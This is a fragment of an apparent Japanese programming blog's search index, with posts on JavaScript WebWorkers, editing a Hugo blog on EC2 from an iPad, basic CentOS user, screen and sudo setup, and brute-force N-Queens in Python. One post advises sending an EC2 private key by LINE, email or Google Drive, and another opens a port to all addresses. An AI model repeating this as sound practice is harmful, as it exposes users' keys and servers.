=\u0026gt; { document.body.classList.add(\u0026#39;run\u0026#39;); const start = Date.now(); const elem = document.querySelector(\u0026#34;#counter\u0026#34;); worker.postMessage(\u0026#34;run\u0026#34;); worker.addEventListener(\u0026#39;message\u0026#39;, (e) =\u0026gt; { if(e.data.mode === \u0026#39;end\u0026#39;) { document.querySelector(\u0026#34;#time\u0026#34;).textContent = Date.now() - start; document.body.classList.remove(\u0026#39;run\u0026#39;); } else { document.querySelector(\u0026#34;#counter\u0026#34;).textContent = e.data.value; } console.log(); }, false); }; 続いて、Worker部分の処理になります。\nworker部分ではフロントのworker_main.jsから実行されたタイミングで動作を開始して、ループの値をフロントに戻すような処理を行います。\nループが終了すると、mode: endと終わったことを通知するようにしました。\nself.addEventListener(\u0026#39;message\u0026#39;, (e) =\u0026gt; { //処理内容 for(let i = 0; i \u0026lt; 100000; i++) { console.log(i); self.postMessage({value: i}); } self.postMessage({mode: \u0026#39;end\u0026#39;}); //処理結果を送信 }, false); それでは実行してみましょう。\nYour browser doesn't support HTML5 video. Here is a link to the video instead. 実行すると、先ほどとまったく違うUIになっているかと思います。\n実はRunを押したタイミングで、ボタンを赤くして、上の四角が回転するようにしてありました。\nWorkerなしの処理ではjavascriptの処理が詰まってしまい、その部分の処理が正しく表示されていなかったということになります。\nWorkerは並列で処理を行える 画面ロックを防ぐ他に、WebWorkerには便利な機能があります。通常、javascriptはシングルスレッドなので並列（マルチスレッド）で処理を行うことができません\nが、WebWorkerを用いることで、複数の処理を同時に行うことが可能になります。\nフロントに関係のないデータの処理 重い処理 上記のような処理をフロントで行うと、画面ロックが発生する原因となるほか、修正なども大変になりますが、webWorkerとして別にjavascriptを用意して実行されるようにしておくことで、メンテナンス性とユーザービリティーが向上します。\n並列処理と聞くとpromiseなどを考えるかと思いますが、promiseは非同期処理であり、並列で処理は行いません。\nWebWorkerを使用する上で注意すべきなのは、documentなどのフロントにある要素にはアクセスできないので、document.writeやdocument.querySelectorなどを使用できません。どうしても使用する場合は、変数としてworkerに対してpostするようにしましょう。\n利用できる関数やAPIなどが下記に一覧で記載されているので参考にしてください。\nWeb Workers が使用できる関数とクラス\nsetTimeoutでもできるけど、オススメしない UIのロックを防ぐ方法として、setTimeoutを使う方法もあります。\nこの方法はworkerを使っていないのですが、setTimeoutを使用することで別タスクとして処理させることができます。\nconst run = () =\u0026gt; { document.body.classList.add(\u0026#39;run\u0026#39;); const start = Date.now(); const elem = document.querySelector(\u0026#34;#counter\u0026#34;); for(let i = 0; i \u0026lt; 100000; i++) { setTimeout(()=\u0026gt;{ console.log(i); elem.textContent = i; }, 0); } document.querySelector(\u0026#34;#time\u0026#34;).textContent = Date.now() - start; document.body.classList.remove(\u0026#39;run\u0026#39;); }; 数字部分は変化しますが、さきほどのようにアニメーションは行われません。\nforの処理が先に終了してしまうため、cssのアニメーションが一瞬で終了してしまうのです。\nYour browser doesn't support HTML5 video. Here is a link to the video instead. まとめ javascriptを使っていると思い処理も当然行う場合があります。そうしたときに、フロントで処理をしてしまうとローディングなどのアニメーションが正しく行われなかったりする原因になってしまいます。\nWorkerを使って、処理を別タスクとしてやることで正しくローディングなどを表示させることが可能です。\n重い処理を行う際は、Workerを使って別タスクで行ってユーザーにストレスを与えないサイトを作っていきましょう。\nオススメの書籍 ゲームで学ぶJavaScript入門 HTML5\u0026amp;CSSも身に付く! 「JavaScriptでココまでできる!」 中学生、高校生のための、ゲームプログラミング入門書の決定版! JavaScriptを使用したWebブラウザゲームの製作ノウハウを解説する入門書です。 Webページをまったく作ったことはないが、現在主流となっているブラウザゲームに興味があり、 「自分でもゲームプログラミングに挑戦してみたい!」と考えている初心者、とくに中・高校生に最適です。 本書では「より面白く」「見栄え良く」をモットーに、13本のサンプルゲームを紹介しています。 ゲームを作りながら、JavaScriptだけでなくHTML5やCSSといったWeb技術の基本もしっかり学習できます。 最後までラクに読めて、感覚的に仕組みを理解できるように、 「楽しさ」が感じられて「飽きさせない」ことを重視した構成になっています。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 確かな力が身につくJavaScript「超」入門 第2版 ◎ 3万部突破のベストセラーが充実のアップデート! JavaScriptをこれから始める人にも、前に挫折したことのある人にも。 手を動かしてサンプルをひとつずつ作っていくことで、知識だけでなく、 現場で活きる、応用・実践につながる基礎力が「この一冊で」身につきます。 ポイント1「サンプルが楽しい。」 よくある“勉強のためのサンプル\u0026#34;を可能な限り排除し、「こういうの見たことある! 」「こういうのが作ってみたかった! 」というような、実際に仕事に使えそうなサンプルを集めました。なので、最初の「やるぞ! 」というモチベーションを維持したまま、最後のページまで読み進めることができます。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-01T14:19:43+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-01-01-wyoshi/catch_hu76eecea6b0108d716a0248cfde205ca5_73592_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-01-01-wyoshi/","title":"javascriptで画面ロックする場合は、Workerを使ってみよう"},{"content":"iPhoneやiPadなどのスマホ、タブレットは持ち運びに非常に便利です。パソコンよりも軽く、パソコンと同等の機能を備えてます。\nそうした端末を使って記事が投稿できたら、スタバやドトールなどのカフェでコーヒーを飲みながら記事を書くことができてしまいます。\n今回は、AmazonのEC2上にあるHugoのブログをiPadを使って更新して見たいと思います。\niPhoneやiPadでターミナルを使う iPhoneやiPadにも数多くの素晴らしいターミナルアプリがあります。\nその中でも私が使っているのはTermius: Terminal \u0026amp; SSH clientというアプリです。\nこのアプリはターミナルの機能を持っており、SSHでのサーバ接続も可能です。もちろんログインの際にpemファイルなどを使用することも可能です。\n基本的な機能は無料で使用できるので、まずはインストールをしてみましょう。\n初期設定 起動すると、アカウントの登録が必要かと思いますが、必要ありません。\n下にある「Learn more」を押して、「Continue without account」にてログイン無しで使えます。\n課金すると様々な機能を使えるようになるので、そういった機能でより便利に使いたい人は是非、課金してください。\nインストールが終わったら「New Hosts」をタプして、ログインしたいサーバを追加するか、「Hosts」メニューの右上にある「＋」ボタンを押してサーバを追加します。\nAlias には自分がわかりやすい名前をつけます。\nHostname にはサーバのドメイン名やIPアドレスを入力します。\nPort はSSHを使うときのポートです。\nそして、ユーザー名とパスワードを使っている人はパスワードを入力します。\npemファイルを使っている人は、pemの内容をコピーして貼り付けるか、パソコンからpemを送信します。\n送信はパソコンでiPadなどを接続して、ファイルタブから贈りたいpemファイルをドラッグ・アンド・ドロップします。\npemファイルをiPadに送り終わったら、Keyを押して、左上の「+」「Import Key」にて先程送ったファイルを選択します。\nこれでキーが設定されました。\nここまで設定できたら、左上の「Save」にて保存しましょう。\n以上でサーバに接続する準備ができました。\nサーバに接続 Alias に設定した名前でアイコンが作成されているかと思います。\nそのアイコンを押すと、know hostsに登録するかどうか聞かれるので、「Continue」を押して追加します。\nうまく設定できていたらサーバに接続できると思います。\nできない場合は、アイコンを長押しして、「Edit」にて情報を正しいものに修正しましょう。\nTabはどうするの？ SSHではtabコマンドで入力の補完を設定しているケースがあるともいます。\niPadにはタブというキーがありません。さて……どうしたものでしょうか。Termius はそこもよく考えられていて、通常であれば画面をタブルタップすると「Tab」と一瞬表示されてタブキーを押したときと同様のことが行なえます。\nその他にも、キーボードの上にある「…」マークを押して、「ギアーアイコン」を押すと初期のキーボード上部のボタンを変更することが可能です。\nTabキーやコントロールキーが使えるとiPadでも十分使えますね。\nhugoで記事を書いて確認する hugoで記事を書くやり方はデザイナーでもできる初めてのHUGO #01を参照してください。\nEC2で記事を書いて、確認しようとするとある疑問を持ってしまいます。それは確認用のサーバはどうしたら良いのかということです。\n通常であれば「localhost:1313」などのURLで確認できます。しかし、EC2ではlocalhostとしてもEC2本体のアドレスではないので、確認できません。\nhugoにはIPを指定してサーバを起動する機能があります。\nhugo server --baseURL=[URL] 上記のコマンドでアクセスできるかというと、まだ駄目です。\n最終的なコマンドは\n$ hugo server --baseURL=http://[EC2のURL] --bind=0.0.0.0 --port=[ポート] となります。\nここで重要なのが--bind=0.0.0.0になります。\nここまできたら、ほぼほぼ確認できるようになっています。\nEC2でファイヤーウォールを設定している場合 EC2を使用している場合、ALBやELBを設定していることが多いと思います。\n先程指定したポートが空いているか確認して、空いていない場合は、EC2の設定で開けましょう。\nEC2のインバウンドルールに開けたいポートを追加します。\nセキュリティーグループを使用している場合は、「インバウンドのルールを編集」をクリックして追加します。\n下にある「ルールを追加」を押して、「カスタムTCP」にします。\n次に、ポート範囲に開けたいポートを入力して、CIDR ブロックにインターネットゲートウェイを指すすべての IPv4 トラフィック (0.0.0.0/0) のルートを追加します。\nIPv6の場合も追加したいので、もう一度「ルールを追加」を押して、ポートを入力し、IPv6 トラフィック (::/0) のルートを入力します。\n設定が終わったら、保存しましょう。\nこれでポートの設定が完了しました。\niPadで確認しながら更新をする サーバにログインして、先程の\n$ hugo server --baseURL=http://[EC2のURL] --bind=0.0.0.0 --port=[ポート] でサーバを立ち上げます。\nこのとき、下書きの記事を表示したいときは\n$ hugo server --baseURL=http://[EC2のURL] --bind=0.0.0.0 --port=[ポート] -D として下書きも表示するようにしましょう。\nまた、サーバのアドレスがわからない場合は\n$ curl -s ifconfig.me とすればIPアドレスがわかります。\niPadにはSplitビューがついているので、片方でブログを書きながら、　もう片方でSafariなどを立ち上げて立ち上げて記事を確認しながら記述することが可能です。\n構築が終わったらiPadに開発環境を構築してみるテストを参考にして、EC2内での詳細な設定をしてみましょう。\nまとめ iPadを使うとどこでも、重いパソコンを持たなくても簡単にブログを更新することができるようになります。是非オススメなので、みなさんも試してみてください。\nおすすめの書籍 iPad完全マニュアル2022(全機種対応/基本操作から活用技まで詳細解説) iPadをしっかり使いこなすための決定版ガイドブック。 iPadOS 15に対応した最新版です。 2021年発売の最新モデルはもちろん、すべてのiPad Pro、iPad Air、iPad、iPad miniの全モデル ホームボタン搭載/非搭載含めすべての機種に対応します。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 AWSではじめるインフラ構築入門 安全で堅牢な本番環境のつくり方 AWSのネイティブ機能を組み合わせて 安全かつ堅牢なインフラを構築・運用 本書は、AWS(Amazon Web Services)を利用して、 インフラを構築/運用する方法を解説する入門書です。 クラウドでネットワーク\u0026amp;サーバー構築を行うために必要な基礎知識や、 AWSのネイティブ機能を組み合わせて安全かつ堅牢なインフラを構築/運用 するための設定方法やノウハウを解説します。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-28T15:35:18+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img11_hueeecba35050a11ee02801fa0306bfd2b_371238_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/","title":"パソコンは不要。スマホ、タブレットでできるブログ投稿"},{"content":"はじめに まずはこちらをやりましょう。\nパソコンは不要。iPhoneやiPadなどのスマホ、タブレットでできるブログ投稿 必要なもの iPad Termiusというアプリ\nTermius: Terminal \u0026amp; SSH client AWSのサーバーインスタンス\nAWS EC2 インスタンスの作成 AWSインスタンスにログインするために必要なpemファイル（キーチェイン）\nAWS EC2にSSHでアクセスする方法 AWSインスタンスへの接続 pemファイルをスマホに送る\nインスタンスを作るときにpemファイルをダウンロードしたと思います\n（してなかったら、pemファイルは一回しかダウンロードさせてくれないのでインスタンスを作り直しましょう）\nこのpemファイルをＰＣのエディターで開き、内容をテキストファイルにペーストします。\nこのファイルをＬＩＮＥなりメールなりGoogleドライブなりでスマホに送ります。\npemファイルをTermiusで読み込みます\nＰＣ上で鍵ファイル(.pem)をテキスト化してiPadで内容をコピーして貼り付けられるようにしておくことが重要です。\niPad Proでsshクライアント「Termius」を使ってみた\niPadからAWSのEC2インスタンス(LINUX)にSSH接続する方法 アカウントの作成 rootでの作業でも良いのですが、一般論としてここではアカウントの作成から説明します。\nまずは、サーバーに接続します。\ncentos$ いわゆるrootでログインした訳です。\nここでユーザー名 suzuki を追加します。\ncentos$ useradd suzuki さらに suzuki のパスワードも設定します。\ncentos$ passwd suzuki パスワードは２回同じ入力を求められます\nでは rootからsuzukiにアカウントを切り換えます。\nユーザーの切り替えは su コマンドを使います。\ncentos$ su suzuki パスワード： suzuki$ suzukiに切り替わりました。\n自分自身がどこにいるのかを確認します。\nカレントディレクトリの確認は pwd コマンドを使います。\nディレクトリの移動は cd コマンド\nホームディレクトリは ~ で表します。\nホームディレクトリへの移動は cd ~ となります。\ncentos$ pwd /home/centos $ cd ~ $ pwd $ /home/suzuki $ ~/.bashrc の修正 ここでは ~/.basrcファイルを修正します。\nまず、~/.basrc ファイルのバックアップをとります。\nここではファイル名先頭のピリオドを落として ls コマンドで見えるようにしておきます。\n$ cp ~/.bashrc ~/bashrc.bak では、~/.bashrc を vimで開いて編集します。\n$ vim ~/.bashrc # .bashrc # Source global definitions if [ -f /etc/bashrc ]; then . /etc/bashrc fi # ターミナルの表示 export PS1=\u0026#34;bash-\\v$ \u0026#34; ; # 基本言語フォーマットをUTF-8へ export LANG=\u0026#34;ja_JP.UTF-8\u0026#34; ; # User specific environment and startup programs alias rm=\u0026#39;rm -i\u0026#39; ; alias cp=\u0026#39;cp -i\u0026#39; ; alias mv=\u0026#39;mv -i\u0026#39; ; # grepとls のカラー表示 alias grep=\u0026#39;grep --color=auto\u0026#39; ; alias ls=\u0026#39;ls --color=auto\u0026#39; ; # screen alias s=\u0026#39;screen -RR\u0026#39; ; # Github ディレクトリへ移動 alias g=\u0026#39;cd ~/GitHub\u0026#39; ; 編集が終わったら ~/.bashrc を再読込します。\nLinux での再読込は . です\n$ . ~/.bashrc $ では GitHub にある様々なディレクトリを格納する Githubディレクトリを作成します。\n$ mkdir GitHub $ 以降の github プロジェクトは今作成した GitHub ディレクトリ以下に作成します。\nターミナルの入力で大文字と小文字を区別せずに補完する # 大文字小文字を区別しない set completion-ignore-case on # 以下日本語入力の必要がある場合に必要(なくてもよい） set input-meta on set output-meta on set convert-meta off set meta-flag on 編集が終わったら ~/.inputrc を再読込します。\nLinux での再読込は . です\n$ . ~/.inputrc $ cd ~ $ pwd /home/suzuki $ g $ pwd /home/suzuki/GitHub $ ヒント ~/.inputrc を root ユーザーになって /etc/inputrc に追記するとすべてのユーザーが大文字小文字を区別することなくターミナルで補完することができます。 screen のインストール screen はターミナル内で複数の仮想ターミナルを起動して使うことができる画面管理ソフトです。\nメリットは、\nターミナルウインドウのタブを複数作成し、ここのタブでサーバーにログインする必要がないので、不要なセッションを作らなくてすむ。 開いていた端末の状態を保持しておける。 回線が切れる、スタンバイなどのセッション切れでもレジュームされる。 一つの画面をさらに分割できるので、複数端末でログ監視したいときなどに超便利。 まずはscreen がインストールされているのかの確認します。\n$ screen -v Screen version 4.08.00 (GNU) 05-Feb-20 $ インストールされていれば以下の作業はする必要がありません。\nインストールされていなければ、yum コマンドでインストールして下さい。\n$ sudo ＜sudo で rootになります＞ # ＜rootになると # になります\u0026gt; # yum -y install screen 読み込んだプラグイン:fastestmirror base | 3.6 kB 00:00:00 extras | 3.4 kB 00:00:00 updates | 3.4 kB 00:00:00 (1/2): extras/7/x86_64/primary_db | 115 kB 00:00:00 (2/2): updates/7/x86_64/primary_db | 2.2 MB 00:00:00 Loading mirror speeds from cached hostfile * base: ftp.iij.ad.jp * extras: ftp.iij.ad.jp * updates: www.ftp.ne.jp 依存性の解決をしています --\u0026gt; トランザクションの確認を実行しています。 ---\u0026gt; パッケージ screen.x86_64 0:4.1.0-0.23.20120314git3c2946.el7_2 を インストール --\u0026gt; 依存性解決を終了しました。 依存性を解決しました ====================================================================================================================================================== Package アーキテクチャー バージョン リポジトリー 容量 ====================================================================================================================================================== インストール中: screen x86_64 4.1.0-0.23.20120314git3c2946.el7_2 base 552 k トランザクションの要約 ====================================================================================================================================================== インストール 1 パッケージ 総ダウンロード容量: 552 k インストール容量: 914 k Downloading packages: screen-4.1.0-0.23.20120314git3c2946.el7_2.x86_64.rpm | 552 kB 00:00:00 Running transaction check Running transaction test Transaction test succeeded Running transaction インストール中 : screen-4.1.0-0.23.20120314git3c2946.el7_2.x86_64 1/1 検証中 : screen-4.1.0-0.23.20120314git3c2946.el7_2.x86_64 1/1 インストール: screen.x86_64 0:4.1.0-0.23.20120314git3c2946.el7_2 完了しました! $ # rootからsuzukiにアカウントを切り換えます $ su suzuki # screenコマンドがどこにインストールされているのかを確認します。 $ which screen /usr/bin/screen $ screenrc の修正 screenコマンドをさらに便利にするために screenrc ファイルを修正します。\n# ユーザーをroot から suzuki に変えます。 $ su suzuki $ 以下を ~/.screenrc として作成して保存します。\n# Ctrl + z で screenの操作モードへの切り換え escape ^Zz # スクロールバッファを大きくする defscrollback 10000 # ステータスバーをカスタマイズ hardstatus on hardstatus alwayslastline \u0026#39;%{= kw}%02c:%s %{= .y}%H %L=%{= .b}%-w%46\u0026gt;%{= .r}%n %t*%{= .b}%+w%-16=%{= .y}[%l]\u0026#39; # スタートメッセージを表示させない startup_message off # ビープを鳴らさない vbell off #termの設定 term ansi bind r bind ^r # 上記 ~/.bashrc の修正で、screenコマンドの呼び出しを s にしています。\n# screen alias s=\u0026#39;screen -RR\u0026#39; ; ですので、ターミナルからは s だけで screen -RR コマンドを実行したことと同じになります。\n# screenの起動 $ screen # screenの終了 $ exit $ # screenの起動 $ s # screenの終了 $ exit ~/.bashrc にエイリアスを作成していなければ screen で起動しますし、~/.bashrcにエイリアスを作成していれば（ここでは「s」） $ s で一発起動します。screenを抜けるときは「exit」です。\nscreen を使ってみます screen の起動(screen)\nまず screen を起動しなくては始まりません。 ログインしたターミナルで「screen」と打てば screen が起動します。 screen から抜けるには普通にログアウトするように 「exit」 や [Ctrl+d]で抜けられます。\n新しいウィンドウを開始する([Ctrl+c])\n「[Ctrl+c]」で新しいウィンドウを開始できます。 幾つでも作れます。 不要になったウィンドウは 「exit」 や [Ctrl+d] で消せます。\n次のウィンドウに移動する([Ctrl+n])\n開いている隣のウインドウに移動します。カスタマイズした~/.screenrcを使っている人はステータスバーで確認できて便利です。\n詳しくはこちら\nLinux screenコマンド使い方\nヒント screen は王者のコマンドです。プログラマーの多くはローカルのターミナルでタブを作成します。screen はサーバー上で仮想端末を作成します。screenはvim同様、プログラマーを選びます。Linuxを語るなら vim と screen そして bash の習熟が必須なのです。 sudoユーザーを追加する方法 sudoユーザーに追加していないユーザーでsudoコマンドを実行すると、\n$ sudo less /etc/passwd [sudo] password for suzuki: suzuki is not in the sudoers file. This incident will be reported. こんな事を言われます。\nということで、ここでは特定のユーザー（ここでは「suzuki」）がsudoコマンドを実行できるようにします。\n/etc/sudoers ファイルにユーザーを追加します。\nまずはrootユーザーになります。\nユーザーsuzuki をぬけてrootになります。\n$ exit 現在のグループを確認します。\n# sudo vim /etc/sudoers 以下の記述があれば wheelグループに suzukiを追加すればよいです。\n## Allow members of group sudo to execute any command %wheel ALL=(ALL:ALL) ALL ではまず現状を確認します。\n# cat /etc/group | grep suzuki sudoのグループ（centosなら wheel) に suzuki を追加します。\n# sudo usermod -G wheel suzuki 確認します。\n# cat /etc/group | grep suzuki wheel:x:10:suzuki suzuki:x:1001: # これで、ローカルアカウント suzuki で、必要に応じて sudoコマンドをつかって安全に作業することができるようになりました。\nヒント 当たり前の話ではありますが、root で作業するのはやめましょう。必要に応じて $ su すればよいのです。Linux/Unixとはそういうものなのです。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-28T14:02:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-28-01-suzuki/linux_hu86d6acd804ad404fbf9e1694bf0c7390_22913_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-28-01-suzuki/","title":"iPadに開発環境を構築してみるテスト"},{"content":"Nクイーン問題とは Nクイーン問題とは、チェスの盤面にクイーンを１行に１個ずつ効き筋に当たらないように置いていこうという問題です。\nhttps://ja.wikipedia.org/wiki/%E3%82%A8%E3%82%A4%E3%83%88%E3%83%BB%E3%82%AF%E3%82%A4%E3%83%BC%E3%83%B3\nNクイーンのNは盤面の行・列の数です８クイーンだと８x８です。\nおける場所の数を算出する法則はないのでプログラムを組んでクイーンを配置していくしかないのですが、\nNの数が増えれば置ける場所の候補が爆発的に増えていきプログラムでも何年経っても終わらないようなものになります。\n現在最大のNは２７クイーンです。\nNクイーンを早く解く方法はいくつかあって、\n①アルゴリズムを使って探索を効率化する\n②ビット計算で計算速度を上げる\n③GPUなどを使って並列計算をする\nなどがあります。\nPythonで頑張る Python は最近すっかりメジャーになり、プログラミング教育が小学校で必修化され最初に学ぶのがPythonだという話もあります。\nライブラリも非常に充実しています。\nそこで勉強を兼ねてPythonを使ってNクイーン問題を解いていこうと思います。\nアルゴリズムなしでNクイーン問題を解こうとすると。。。 Nクイーンはアルゴリズムを使うとどのくらい早くなるのでしょうか。\nそれを体感するために今回はまったくアルゴリズムを使わないでプログラムにNクイーン問題に取り組ませてみましょう。\nまったくアルゴリズムを使わない方法は「ブルートフォース　力任せ探索」と呼ばれるものです。\nN4だと4の4乗で256パターン\n私のPCだと0m0.042sで終了しますが\nN8だと8の8乗で16777216パターン\n3m7.321sもかかってしまいます。\nちなみに今後やる検索効率化アルゴリズム「バックトラック」だと\nN8でと0m0.03sで完了します（もっと早いアルゴリズムも出てきます。）。\nここでは触って動かしてみていただいて時間かかるなあと思っていただければ良いです。\nプログラムについて プログラムは以下のgitにあります。\nhttps://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py01_nqueen.py\nこのプログラムは鈴木維一郎先生が作成したものです。\n私はこのプログラムを初めてみながらpythonだとこう書くんだと思いながら\npythonの勉強させてもらいながらコメントしていく感じになります。\nプログラムのダウンロード方法は以下です。\ngit clone https://github.com/suzukiiichiro/N-Queens/\n実行方法は\nN-Queens/03Pythonに移動して\npython py01_nqueen.py\nです。\nプログラム概要 このプログラムでやりたいことはエイトクイーン(N=8)の時に全ての可能性のある解の候補を体系的に数え上げます。\n利き筋などは全く考えず1行に1個ずつクイーンを置いていきます。\nパターン数はNxNになるのでエイトクイーン(N=8)だと8の8乗16777216パターンクイーンを配置します。\nプログラムがやるのはここまでです。これが正解かどうかはプログラムではチェックしません。\nプログラムが列挙したパターンから人力でどれが正解かをチェックしようと思ったらエイトクイーン(N=8)でも相当の年月がかかりますね。\n出力はパターンのカウント数と各行にクイーンが置かれた場所になります。\n1: 00000000 2: 00000001 3: 00000002 4: 00000003 . . . 163100: 00476433 163101: 00476434 163102: 00476435 163103: 00476436 . . . 16777213: 77777774 16777214: 77777775 16777215: 77777776 16777216: 77777777 例えば\n163101: 00476434\nだと\n163101はカウント数です。163101番目のパターンという意味です。\n00476434はクイーンが置かれた場所です\n左端が1行目で左から右へ行数が増えていきます。\nクイーンの位置が\n0:1行目は0なので右から1番目\n0:2行目は0なので右から1番目\n4:3行目は4なので右から5番目\n7:4行目は7なので右から8番目\n6:5行目は6なので右から7番目\n4:6行目は4なので右から5番目\n3:7行目は3なので右から4番目\n4:8行目は4なので右から5番目\nに置かれたということを表現しています。\n図にすると以下になります\n図 この例だと2行目に1行目と同じ列にクイーンを配置しているので、2行目の段階で1行目の下の効き筋に引っかかっているので解にはなりません。\n次回はプログラム詳細について説明していきたいと思います。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! 